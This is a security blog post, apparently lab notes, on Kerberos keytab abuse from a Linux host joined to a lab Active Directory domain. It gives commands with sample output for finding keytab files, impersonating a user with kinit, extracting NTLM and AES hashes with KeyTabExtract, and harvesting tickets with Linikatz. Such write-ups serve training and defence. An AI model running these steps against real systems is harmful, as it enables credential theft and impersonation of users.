@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PTT : KeyTab File Abuse | Twistzz</title><meta name="author" content="Twistzz"><meta name="copyright" content="Twistzz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Finding Keytab filesNote:➜ To use a keytab file, we must have read and write (rw) privileges on the file. ➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on &#x2F;etc&#x2F;kr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PTT : KeyTab File Abuse">
+<meta property="og:url" content="https://twistzz-ctf.github.io/2025/11/29/PTT-KeyTab-File-Abuse/index.html">
+<meta property="og:site_name" content="Twistzz">
+<meta property="og:description" content="Finding Keytab filesNote:➜ To use a keytab file, we must have read and write (rw) privileges on the file. ➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on &#x2F;etc&#x2F;kr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://twistzz-ctf.github.io/images/avatar.png">
+<meta property="article:published_time" content="2025-11-29T20:23:46.000Z">
+<meta property="article:modified_time" content="2026-08-18T23:24:51.575Z">
+<meta property="article:author" content="Twistzz">
+<meta property="article:tag" content="KeyTabExtract">
+<meta property="article:tag" content="kinit">
+<meta property="article:tag" content="klist">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twistzz-ctf.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PTT : KeyTab File Abuse",
+  "url": "https://twistzz-ctf.github.io/2025/11/29/PTT-KeyTab-File-Abuse/",
+  "image": "https://twistzz-ctf.github.io/images/avatar.png",
+  "datePublished": "2025-11-29T20:23:46.000Z",
+  "dateModified": "2026-08-18T23:24:51.575Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Twistzz",
+      "url": "https://twistzz-ctf.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.ico"><link rel="canonical" href="https://twistzz-ctf.github.io/2025/11/29/PTT-KeyTab-File-Abuse/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PTT : KeyTab File Abuse',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/avatar.png" alt="Logo"><span class="site-name">Twistzz</span></a><a class="nav-page-title" href="/"><span class="site-name">PTT : KeyTab File Abuse</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">PTT : KeyTab File Abuse</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-29T20:23:46.000Z" title="Created 2025-11-29 21:23:46">2025-11-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-18T23:24:51.575Z" title="Updated 2026-08-19 00:24:51">2026-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/">Active Directory</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Linux/">Linux</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Linux/Post-Exploitation/">Post Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Linux/Post-Exploitation/Pass-the-Ticket-Ptt/">Pass the Ticket (Ptt)</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Linux/Post-Exploitation/Pass-the-Ticket-Ptt/KeyTab-File-Abuse/">KeyTab File Abuse</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
+<p><code>➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on /etc/krb5.keytab and we can&#39;t read it without root permission.</code></p>
+<h4 id="Using-Find"><a href="#Using-Find" class="headerlink" title="Using Find"></a>Using Find</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name *keytab* -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab</span><br><span class="line">   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<h4 id="Identifying-Keytab-files-in-Cronjobs"><a href="#Identifying-Keytab-files-in-Cronjobs" class="headerlink" title="Identifying Keytab files in Cronjobs"></a>Identifying Keytab files in Cronjobs</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt</span><br><span class="line"></span><br><span class="line">smbclient //dc01.inlanefreight.htb/svc_workstations -c <span class="string">&#x27;ls&#x27;</span>  -k -no-pass &gt; /home/carlos@inlanefreight.htb/script-test-results.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="KeyTab-File-Abuse"><a href="#KeyTab-File-Abuse" class="headerlink" title="KeyTab File Abuse"></a>KeyTab File Abuse</h1><h2 id="Impersonating-User-With-KeyTab"><a href="#Impersonating-User-With-KeyTab" class="headerlink" title="Impersonating User With KeyTab"></a>Impersonating User With KeyTab</h2><h4 id="Listing-KeyTab-file-information"><a href="#Listing-KeyTab-file-information" class="headerlink" title="Listing KeyTab file information"></a>Listing KeyTab file information</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">klist -k -t /opt/specialfiles/carlos.keytab</span><br><span class="line"></span><br><span class="line">Keytab name: FILE:/opt/specialfiles/carlos.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>
+
+<h4 id="Impersonating-Target-User"><a href="#Impersonating-Target-User" class="headerlink" title="Impersonating Target User"></a>Impersonating Target User</h4><p><code>➜ Note: kinit is case-sensitive, so we must use the exact same principal name as shown in klist.</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu</span><br><span class="line">Default principal: carlos@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/07/22 17:16:11</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Connecting to SMB Share as Carlos</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient //dc01/carlos -k -c <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">  .                                   D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  ..                                  D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 4452852 blocks available</span><br></pre></td></tr></table></figure>
+
+<h2 id="Extract-NTLM-Hash-From-Keytab"><a href="#Extract-NTLM-Hash-From-Keytab" class="headerlink" title="Extract NTLM Hash From Keytab"></a>Extract NTLM Hash From Keytab</h2><h4 id="Extracting-KeyTab-hashes-with-KeyTabExtract"><a href="#Extracting-KeyTab-hashes-with-KeyTabExtract" class="headerlink" title="Extracting KeyTab hashes with KeyTabExtract"></a>Extracting KeyTab hashes with KeyTabExtract</h4><p><a target="_blank" rel="noopener" href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> will extract information such as the realm, Service Principal, Encryption Type, and Hashes.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab</span><br><span class="line"></span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">        REALM : INLANEFREIGHT.HTB</span><br><span class="line">        SERVICE PRINCIPAL : carlos/</span><br><span class="line">        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60</span><br><span class="line">        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f</span><br><span class="line">        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ Then we can perform pass hash attack or crack the ntlm hash</code></p>
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:</span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io">Twistzz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io/2025/11/29/PTT-KeyTab-File-Abuse/">https://twistzz-ctf.github.io/2025/11/29/PTT-KeyTab-File-Abuse/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/klist/">klist</a><a class="post-meta__tags" href="/tags/kinit/">kinit</a><a class="post-meta__tags" href="/tags/KeyTabExtract/">KeyTabExtract</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/29/PTT-Abusing-KeyTab-ccache/" title="PTT : Abusing KeyTab ccache"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">PTT : Abusing KeyTab ccache</div></div><div class="info-2"><div class="info-item-1">Finding ccache filesReviewing environment variables for ccache files.123env | grep -i krb5KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh  Searching for ccache files in &#x2F;tmp➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid. 12345ls -la /tmp-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau-rw-------  1 david@inlanefreight.htb  domain users@inlan...</div></div></div></a><a class="pagination-related" href="/2025/11/27/Windows-Pass-the-Ticket-PtT/" title="Windows Pass the Ticket (PtT)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Windows Pass the Ticket (PtT)</div></div><div class="info-2"><div class="info-item-1">Harvesting Kerberos ticketsMimikatz➜ As a non-administrative user we can only get our tickets. ➜ As a local administrator user we can collect everything. 12345678910mimikatz.exemimikatz # privilege::debugmimikatz # sekurlsa::tickets /export* Saved to file [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi !* Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !Group 2 - Ticket Granting Ticket  1234c:\tools&gt; dir *.kirbi-a----        7/12/2022   9:44 AM ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/29/PTT-Abusing-KeyTab-ccache/" title="PTT : Abusing KeyTab ccache"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-29</div><div class="info-item-2">PTT : Abusing KeyTab ccache</div></div><div class="info-2"><div class="info-item-1">Finding ccache filesReviewing environment variables for ccache files.123env | grep -i krb5KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh  Searching for ccache files in &#x2F;tmp➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid. 12345ls -la /tmp-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau-rw-------  1 david@inlanefreight.htb  domain users@inlan...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Twistzz</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">417</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">66</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Twistzz-cb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Finding-Keytab-files"><span class="toc-number">1.</span> <span class="toc-text">Finding Keytab files</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Note"><span class="toc-number">1.1.</span> <span class="toc-text">Note:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Using-Find"><span class="toc-number">1.2.</span> <span class="toc-text">Using Find</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Identifying-Keytab-files-in-Cronjobs"><span class="toc-number">1.3.</span> <span class="toc-text">Identifying Keytab files in Cronjobs</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#KeyTab-File-Abuse"><span class="toc-number">2.</span> <span class="toc-text">KeyTab File Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Impersonating-User-With-KeyTab"><span class="toc-number">2.1.</span> <span class="toc-text">Impersonating User With KeyTab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Listing-KeyTab-file-information"><span class="toc-number">2.1.1.</span> <span class="toc-text">Listing KeyTab file information</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Impersonating-Target-User"><span class="toc-number">2.1.2.</span> <span class="toc-text">Impersonating Target User</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example"><span class="toc-number">2.1.3.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extract-NTLM-Hash-From-Keytab"><span class="toc-number">2.2.</span> <span class="toc-text">Extract NTLM Hash From Keytab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Extracting-KeyTab-hashes-with-KeyTabExtract"><span class="toc-number">2.2.1.</span> <span class="toc-text">Extracting KeyTab hashes with KeyTabExtract</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Automated-Harvesting-Of-Ccache-Files"><span class="toc-number">3.</span> <span class="toc-text">Automated Harvesting Of Ccache Files</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linikatz"><span class="toc-number">3.1.</span> <span class="toc-text">Linikatz</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/07/Abusing-Foreign-Group-Membership/" title="Abusing Foreign Group Membership">Abusing Foreign Group Membership</a><time datetime="2026-07-07T07:29:09.000Z" title="Created 2026-07-07 08:29:09">2026-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Forest-Trust-Enumeration/" title="Forest Trust Enumeration">Forest Trust Enumeration</a><time datetime="2026-07-06T14:00:25.000Z" title="Created 2026-07-06 15:00:25">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Child-Parent-Trust-Enumeration/" title="Child-Parent Trust Enumeration">Child-Parent Trust Enumeration</a><time datetime="2026-07-06T13:42:32.000Z" title="Created 2026-07-06 14:42:32">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups">Users &amp; Groups</a><time datetime="2026-07-06T13:13:08.000Z" title="Created 2026-07-06 14:13:08">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs">Domain and ACLs</a><time datetime="2026-07-06T12:24:06.000Z" title="Created 2026-07-06 13:24:06">2026-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Twistzz</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
